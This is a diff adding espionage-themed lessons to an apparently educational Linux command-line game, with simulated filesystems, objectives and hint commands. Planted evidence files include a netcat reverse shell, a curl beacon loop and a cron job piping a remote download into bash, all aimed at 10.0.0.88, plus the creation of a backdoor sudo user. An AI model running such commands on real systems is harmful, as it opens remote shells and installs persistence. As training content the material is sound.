@@ -44,6 +44,21 @@ const CLHConfig = (function() {
             modules: ['CLH-013', 'CLH-014', 'CLH-015'],
             badge: 'cli-phantom',
             description: 'Advanced operations'
+        },
+        'CLI Specter': {
+            modules: ['CLH-016', 'CLH-017', 'CLH-018', 'CLH-019', 'CLH-020', 'CLH-021', 'CLH-022'],
+            badge: 'cli-specter',
+            description: 'System reconnaissance and infiltration'
+        },
+        'CLI Wraith': {
+            modules: ['CLH-023', 'CLH-024', 'CLH-025', 'CLH-026', 'CLH-027'],
+            badge: 'cli-wraith',
+            description: 'Persistence and privilege escalation'
+        },
+        'CLI Ghost': {
+            modules: ['CLH-028', 'CLH-029', 'CLH-030'],
+            badge: 'cli-ghost',
+            description: 'Elite field operations'
         }
     };
 
@@ -2338,6 +2353,844 @@ STATUS: ACTIVE THREAT`
                     hint: 'Save report: echo "Investigation Complete" > /evidence/report.txt',
                     check: (cmd, state) => cmd.includes('>') && cmd.includes('report')
                 },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-016: System Intel
+        // Theme: Embassy workstation profiling before implant deployment
+        // ──────────────────────────────────────────────────────────
+        'CLH-016': {
+            title: 'System Intel',
+            description: 'Profile a compromised embassy workstation before deploying collection tools.',
+            prerequisites: ['CLH-015'],
+            tier: 'CLI Specter',
+            user: 'operator',
+            hostname: 'EMBASSY-WS-07',
+            startDir: '/home/operator',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/operator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['.ssh', 'intel', 'tools', '.bashrc']
+                },
+                '/home/operator/.ssh': {
+                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
+                    children: ['id_rsa', 'id_rsa.pub', 'known_hosts']
+                },
+                '/home/operator/.ssh/id_rsa': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 1675,
+                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - OPERATIONAL KEY]\n-----END OPENSSH PRIVATE KEY-----'
+                },
+                '/home/operator/intel': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['notes.txt', 'targets.list']
+                },
+                '/home/operator/intel/notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
+                    content: 'OPERATION IRON HARVEST\n======================\nTarget: Embassy IT Admin Workstation\nAccess: SSH key compromise\nObjective: Profile system for implant deployment\n'
+                },
+                '/home/operator/tools': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['recon.sh', 'exfil.py']
+                },
+                '/home/ambassador': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'ambassador', group: 'ambassador',
+                    children: ['documents', 'emails', '.classified']
+                },
+                '/home/ambassador/.classified': {
+                    type: 'dir', perms: 'drwx------', owner: 'ambassador', group: 'ambassador',
+                    children: ['MAJESTIC-12.pdf', 'TREATY-DRAFT.doc', 'ASSET-LIST.xlsx']
+                },
+                '/home/attache': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'attache', group: 'attache',
+                    children: ['reports', 'schedules']
+                },
+                '/data': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['backups', 'archives', 'diplomatic-cables']
+                },
+                '/data/diplomatic-cables': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'staff',
+                    children: ['2024-Q1', '2024-Q2', '2024-Q3', '2024-Q4']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'IDENTIFY: System Architecture', hint: '$ uname -a', check: (cmd) => cmd.includes('uname') },
+                { id: 2, task: 'PROFILE: CPU Capabilities', hint: '$ lscpu', check: (cmd) => cmd.includes('lscpu') },
+                { id: 3, task: 'ASSESS: Memory Resources', hint: '$ free -h', check: (cmd) => cmd.includes('free') },
+                { id: 4, task: 'ANALYZE: Disk Space', hint: '$ df -h', check: (cmd) => cmd.includes('df') },
+                { id: 5, task: 'ESTIMATE: Target Directory Size', hint: '$ du -sh /home', check: (cmd) => cmd.includes('du') && cmd.includes('/home') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-017: Find & Locate
+        // Theme: Mole hunt - finding hidden files and backdoors
+        // ──────────────────────────────────────────────────────────
+        'CLH-017': {
+            title: 'Find & Locate',
+            description: 'Hunt for trojans and hidden files planted by a mole on a compromised system.',
+            prerequisites: ['CLH-016'],
+            tier: 'CLI Specter',
+            user: 'hunter',
+            hostname: 'BLACKSITE-7',
+            startDir: '/home/hunter',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/hunter': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
+                    children: ['toolkit', 'reports', '.bashrc']
+                },
+                '/home/hunter/toolkit': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
+                    children: ['scanner.sh', 'hasher.py']
+                },
+                '/home/analyst': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['.bashrc', '.secret_keys', '.backdoor.sh', '.classified']
+                },
+                '/home/analyst/.secret_keys': {
+                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 512,
+                    content: '[SUSPICIOUS] API keys and credentials stored in hidden file'
+                },
+                '/home/analyst/.backdoor.sh': {
+                    type: 'file', perms: '-rwx------', owner: 'analyst', group: 'analyst', size: 1024,
+                    content: '#!/bin/bash\n# TROJAN - Reverse shell to mole C2\nnc -e /bin/bash 10.0.0.88 4444'
+                },
+                '/home/mole': {
+                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
+                    children: ['.exfil_staging', '.local']
+                },
+                '/home/mole/.exfil_staging': {
+                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
+                    children: ['classified_docs.tar.gz']
+                },
+                '/home/mole/.local': {
+                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
+                    children: ['pwn']
+                },
+                '/home/mole/.local/pwn': {
+                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 8192,
+                    content: '[SUID BINARY - Privilege escalation backdoor]'
+                },
+                '/tmp': {
+                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
+                    children: ['.cache', '.hidden', 'beacon.sh']
+                },
+                '/tmp/.cache': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['rootshell']
+                },
+                '/tmp/.cache/rootshell': {
+                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 16384,
+                    content: '[SUID BACKDOOR in /tmp - HIGHLY SUSPICIOUS]'
+                },
+                '/tmp/.hidden': {
+                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
+                    children: ['exfil.tar', 'keylogger']
+                },
+                '/tmp/beacon.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'mole', group: 'mole', size: 256,
+                    content: '#!/bin/bash\nwhile true; do curl -s http://10.0.0.88/beacon; sleep 300; done'
+                },
+                '/var/tmp': {
+                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
+                    children: ['privesc']
+                },
+                '/var/tmp/privesc': {
+                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 4096,
+                    content: '[PRIVILEGE ESCALATION TOOL]'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'HUNT: Hidden Dot-Files', hint: '$ find /home -name ".*" -type f', check: (cmd) => cmd.includes('find') && cmd.includes('-name') && cmd.includes('.*') },
+                { id: 2, task: 'LOCATE: SUID Backdoors', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') },
+                { id: 3, task: 'SEARCH: Temp Directory Drops', hint: '$ find /tmp -type f', check: (cmd) => cmd.includes('find') && cmd.includes('/tmp') },
+                { id: 4, task: 'TRACK: Recent Modifications', hint: '$ find / -mtime -1 -type f 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-mtime') },
+                { id: 5, task: 'VERIFY: Binary Locations', hint: '$ which sudo && whereis bash', check: (cmd) => cmd.includes('which') || cmd.includes('whereis') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-018: Archive Operations
+        // Theme: Dead drop - extracting and packaging intel
+        // ──────────────────────────────────────────────────────────
+        'CLH-018': {
+            title: 'Archive Operations',
+            description: 'Extract intel packages from dead drops and prepare them for exfiltration.',
+            prerequisites: ['CLH-017'],
+            tier: 'CLI Specter',
+            user: 'courier',
+            hostname: 'DEAD-DROP',
+            startDir: '/home/courier',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/courier': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
+                    children: ['incoming', 'outgoing', 'staging', '.bashrc']
+                },
+                '/home/courier/incoming': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
+                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg']
+                },
+                '/home/courier/incoming/package_alpha.tar.gz': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 2097152,
+                    content: '[COMPRESSED ARCHIVE - tar.gz format]'
+                },
+                '/home/courier/incoming/package_beta.zip': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 1048576,
+                    content: '[COMPRESSED ARCHIVE - zip format]'
+                },
+                '/home/courier/incoming/encrypted_bundle.tar.gpg': {
+                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 4194304,
+                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]'
+                },
+                '/home/courier/outgoing': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
+                    children: []
+                },
+                '/home/courier/staging': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
+                    children: ['manifest.txt']
+                },
+                '/home/courier/staging/manifest.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 256,
+                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n'
+                },
+                '/var/dead-drops': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
+                    children: ['drop_01', 'drop_02', 'drop_03']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/', check: (cmd) => cmd.includes('ls') && cmd.includes('incoming') },
+                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz', check: (cmd) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) },
+                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) },
+                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) },
+                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz', check: (cmd) => (cmd.includes('gzip') && cmd.includes('-t')) || (cmd.includes('tar') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-019: Disk Forensics
+        // Theme: Evidence lab - analyzing disk images
+        // ──────────────────────────────────────────────────────────
+        'CLH-019': {
+            title: 'Disk Forensics',
+            description: 'Analyze disk images in the forensics lab to extract evidence.',
+            prerequisites: ['CLH-018'],
+            tier: 'CLI Specter',
+            user: 'forensics',
+            hostname: 'EVIDENCE-LAB',
+            startDir: '/home/forensics',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/forensics': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: ['cases', 'tools', 'reports', '.bashrc']
+                },
+                '/home/forensics/cases': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: ['case_2024_001', 'case_2024_002']
+                },
+                '/home/forensics/cases/case_2024_001': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: ['disk.img', 'memory.dmp', 'notes.txt']
+                },
+                '/home/forensics/cases/case_2024_001/disk.img': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 1073741824,
+                    content: '[RAW DISK IMAGE - 1GB]'
+                },
+                '/home/forensics/cases/case_2024_001/notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 512,
+                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\n'
+                },
+                '/home/forensics/tools': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: ['recover.sh', 'timeline.py']
+                },
+                '/home/forensics/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: []
+                },
+                '/mnt': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['evidence']
+                },
+                '/mnt/evidence': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['home', 'var', 'tmp']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h', check: (cmd) => cmd.includes('df') },
+                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk', check: (cmd) => cmd.includes('lsblk') },
+                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*', check: (cmd) => cmd.includes('du') && cmd.includes('evidence') },
+                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f', check: (cmd) => cmd.includes('find') && cmd.includes('-size') },
+                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/', check: (cmd) => cmd.includes('grep') && cmd.includes('evidence') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-020: User Reconnaissance
+        // Theme: Profiling users on a compromised system
+        // ──────────────────────────────────────────────────────────
+        'CLH-020': {
+            title: 'User Reconnaissance',
+            description: 'Profile user accounts and privileges on a compromised system.',
+            prerequisites: ['CLH-019'],
+            tier: 'CLI Specter',
+            user: 'auditor',
+            hostname: 'BLACKSITE-7',
+            startDir: '/home/auditor',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/auditor': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
+                    children: ['audit_logs', 'reports', '.bashrc']
+                },
+                '/home/auditor/audit_logs': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
+                    children: ['user_activity.log']
+                },
+                '/home/admin': {
+                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
+                    children: ['.ssh', 'scripts', '.bash_history']
+                },
+                '/home/admin/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 1024,
+                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\n'
+                },
+                '/home/sysadmin': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
+                    children: ['.ssh', 'maintenance']
+                },
+                '/home/backdoor': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
+                    children: ['.bashrc', 'tools']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id', check: (cmd) => cmd.includes('whoami') || cmd.includes('id') },
+                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd', check: (cmd) => cmd.includes('cat') && cmd.includes('passwd') },
+                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group', check: (cmd) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) },
+                { id: 4, task: 'CHECK: Login History', hint: '$ last', check: (cmd) => cmd.includes('last') || cmd.includes('lastlog') },
+                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l', check: (cmd) => cmd.includes('sudoers') || cmd.includes('sudo -l') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-021: SSH Operations
+        // Theme: Secure tunnel establishment for exfiltration
+        // ──────────────────────────────────────────────────────────
+        'CLH-021': {
+            title: 'SSH Operations',
+            description: 'Establish encrypted tunnels for secure intel exfiltration.',
+            prerequisites: ['CLH-020'],
+            tier: 'CLI Specter',
+            user: 'operator',
+            hostname: 'SAFEHOUSE',
+            startDir: '/home/operator',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/operator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', '.bashrc']
+                },
+                '/home/operator/.ssh': {
+                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
+                    children: ['known_hosts', 'config']
+                },
+                '/home/operator/.ssh/known_hosts': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
+                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
+                },
+                '/home/operator/.ssh/config': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 128,
+                    content: 'Host relay\n    HostName relay.langley.gov\n    User handler\n    IdentityFile ~/.ssh/id_ed25519\n'
+                },
+                '/home/operator/mission_brief.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
+                    content: 'OPERATION SILENT RELAY\n======================\nObjective: Exfiltrate UMBRA intercepts via SSH tunnel\nHandler: RAVEN-7 @ relay.langley.gov\nProtocol: Generate key, deploy, establish tunnel\n'
+                },
+                '/home/operator/UMBRA_intercepts.tar.gz': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 2516582,
+                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519', check: (cmd) => cmd.includes('ssh-keygen') },
+                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/', check: (cmd) => cmd.includes('ls') && cmd.includes('.ssh') },
+                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config', check: (cmd) => cmd.includes('cat') && cmd.includes('config') },
+                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)', check: (cmd) => cmd.includes('ssh') && !cmd.includes('keygen') },
+                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:', check: (cmd) => cmd.includes('scp') || cmd.includes('rsync') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-022: Network Reconnaissance
+        // Theme: Mapping network infrastructure
+        // ──────────────────────────────────────────────────────────
+        'CLH-022': {
+            title: 'Network Reconnaissance',
+            description: 'Map network infrastructure from a compromised outpost.',
+            prerequisites: ['CLH-021'],
+            tier: 'CLI Specter',
+            user: 'recon',
+            hostname: 'OUTPOST-7',
+            startDir: '/home/recon',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/recon': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
+                    children: ['scans', 'notes', 'tools', '.bashrc']
+                },
+                '/home/recon/scans': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
+                    children: ['initial_sweep.txt', 'port_scan.txt']
+                },
+                '/home/recon/scans/initial_sweep.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 512,
+                    content: 'NETWORK SWEEP RESULTS\n=====================\n192.168.1.0/24 - Corporate LAN\n10.0.0.0/8 - Internal Services\n172.16.0.0/16 - DMZ\n'
+                },
+                '/home/recon/notes': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
+                    children: ['targets.txt']
+                },
+                '/home/recon/tools': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
+                    children: ['scanner.sh']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)', check: (cmd) => cmd.includes('ip ') || cmd.includes('ifconfig') },
+                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)', check: (cmd) => cmd.includes('route') || cmd.includes('netstat') },
+                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)', check: (cmd) => cmd.includes('ss ') || (cmd.includes('netstat') && cmd.includes('-')) },
+                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf', check: (cmd) => cmd.includes('resolv') },
+                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1', check: (cmd) => cmd.includes('ping') || cmd.includes('traceroute') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-023: Service Management
+        // Theme: Analyzing services on compromised server
+        // ──────────────────────────────────────────────────────────
+        'CLH-023': {
+            title: 'Service Management',
+            description: 'Analyze running services on a compromised server.',
+            prerequisites: ['CLH-022'],
+            tier: 'CLI Wraith',
+            user: 'analyst',
+            hostname: 'COMPROMISED-SRV',
+            startDir: '/home/analyst',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/analyst': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['analysis', 'reports', '.bashrc']
+                },
+                '/home/analyst/analysis': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['services.txt', 'suspicious.txt']
+                },
+                '/home/analyst/analysis/suspicious.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
+                    content: 'SUSPICIOUS SERVICES\n===================\nxmrig - Cryptominer\nreverse_shell.service - Backdoor\nbeacon.timer - C2 heartbeat\n'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service', check: (cmd) => cmd.includes('systemctl') && cmd.includes('list') },
+                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('status') },
+                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('cat') },
+                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed', check: (cmd) => cmd.includes('systemctl') && cmd.includes('failed') },
+                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled', check: (cmd) => cmd.includes('systemctl') && cmd.includes('enabled') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-024: Scheduled Tasks (Cron)
+        // Theme: Finding persistence mechanisms
+        // ──────────────────────────────────────────────────────────
+        'CLH-024': {
+            title: 'Scheduled Tasks',
+            description: 'Hunt for malicious cron jobs and persistence mechanisms.',
+            prerequisites: ['CLH-023'],
+            tier: 'CLI Wraith',
+            user: 'operator',
+            hostname: 'BEACON-NODE',
+            startDir: '/home/operator',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/operator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['.bashrc', 'analysis']
+                },
+                '/var/spool/cron/crontabs': {
+                    type: 'dir', perms: 'drwx-wx--T', owner: 'root', group: 'crontab',
+                    children: ['root', 'operator']
+                },
+                '/var/spool/cron/crontabs/root': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'crontab', size: 256,
+                    content: '# Suspicious entries\n*/5 * * * * /tmp/.hidden/beacon.sh\n0 * * * * curl http://10.0.0.88/update | bash\n'
+                },
+                '/etc/cron.d': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['e2scrub_all', 'popularity-contest', 'backdoor']
+                },
+                '/etc/cron.d/backdoor': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
+                    content: '# MALICIOUS\n*/10 * * * * root /opt/.malware/persist.sh\n'
+                },
+                '/etc/crontab': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
+                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l', check: (cmd) => cmd.includes('crontab') && cmd.includes('-l') },
+                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab', check: (cmd) => cmd.includes('cat') && cmd.includes('crontab') },
+                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/', check: (cmd) => cmd.includes('ls') && cmd.includes('cron') },
+                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron* -type f', check: (cmd) => cmd.includes('find') && cmd.includes('cron') },
+                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor', check: (cmd) => cmd.includes('cat') && cmd.includes('backdoor') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-025: Package Management
+        // Theme: Forensic analysis of installed packages
+        // ──────────────────────────────────────────────────────────
+        'CLH-025': {
+            title: 'Package Management',
+            description: 'Analyze installed packages for unauthorized software.',
+            prerequisites: ['CLH-024'],
+            tier: 'CLI Wraith',
+            user: 'analyst',
+            hostname: 'FORENSIC-WS',
+            startDir: '/home/analyst',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/analyst': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['package_audit', 'reports', '.bashrc']
+                },
+                '/home/analyst/package_audit': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['baseline.txt', 'current.txt', 'diff.txt']
+                },
+                '/home/analyst/package_audit/baseline.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
+                    content: 'Known good package list from clean install...'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)', check: (cmd) => cmd.includes('dpkg') || (cmd.includes('apt') && cmd.includes('list')) },
+                { id: 2, task: 'SEARCH: Specific Package', hint: '$ dpkg -l | grep ssh', check: (cmd) => cmd.includes('dpkg') && cmd.includes('grep') },
+                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-s') },
+                { id: 4, task: 'FIND: Recently Installed', hint: '$ grep " install " /var/log/dpkg.log', check: (cmd) => cmd.includes('grep') && cmd.includes('dpkg.log') },
+                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-V') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-026: Access Control
+        // Theme: Privilege escalation analysis
+        // ──────────────────────────────────────────────────────────
+        'CLH-026': {
+            title: 'Access Control',
+            description: 'Analyze access controls and find privilege escalation paths.',
+            prerequisites: ['CLH-025'],
+            tier: 'CLI Wraith',
+            user: 'infiltrator',
+            hostname: 'EMBASSY-SRV',
+            startDir: '/home/infiltrator',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/infiltrator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
+                    children: ['privesc_notes', '.bashrc']
+                },
+                '/home/infiltrator/privesc_notes': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
+                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt']
+                },
+                '/home/infiltrator/privesc_notes/suid_binaries.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
+                    content: 'SUID BINARIES OF INTEREST\n=========================\n/usr/bin/find - GTFOBins exploit available\n/usr/bin/vim - Can spawn shell\n/opt/custom/backup - Custom binary, investigate\n'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups', check: (cmd) => cmd.includes('id') || cmd.includes('groups') },
+                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') },
